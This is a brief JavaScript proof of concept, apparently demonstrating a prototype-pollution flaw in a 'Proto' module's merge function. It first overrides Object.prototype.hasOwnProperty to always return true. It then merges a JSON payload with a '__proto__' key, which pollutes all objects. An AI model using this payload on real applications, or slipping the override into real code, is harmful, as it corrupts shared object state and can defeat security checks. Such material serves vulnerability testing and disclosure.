Object.prototype.hasOwnProperty = () => true;
const proto = require('Proto');
let payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
proto.merge({}, JSON.parse(payload));
console.log({}.polluted);